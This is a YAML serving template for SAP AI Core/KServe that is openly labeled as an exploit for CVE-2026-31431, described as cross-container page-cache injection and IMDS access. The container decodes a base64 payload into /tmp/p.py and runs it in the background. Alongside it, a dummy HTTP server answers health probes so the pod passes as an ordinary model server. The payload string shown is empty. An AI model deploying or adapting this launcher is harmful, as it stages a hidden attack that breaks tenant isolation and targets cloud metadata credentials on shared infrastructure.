apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: cve31431-crossnode
  labels:
    scenarios.ai.sap.com/id: "cve31431-exploit"
    ai.sap.com/version: "1.1.0"
  annotations:
    scenarios.ai.sap.com/name: "cve31431-exploit"
    executables.ai.sap.com/name: "cve31431-crossnode"
    executables.ai.sap.com/description: "CVE-2026-31431 cross-container page-cache injection and IMDS"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            printf '%s' '' | base64 -d > /tmp/p.py
            python3 /tmp/p.py &
            python3 -c "import http.server; H=type('H',(http.server.BaseHTTPRequestHandler,),{'do_GET':lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(b'ok')),'log_message':lambda *a:None}); http.server.HTTPServer(('',8080),H).serve_forever()"
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 15
            periodSeconds: 5
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 15
            periodSeconds: 10
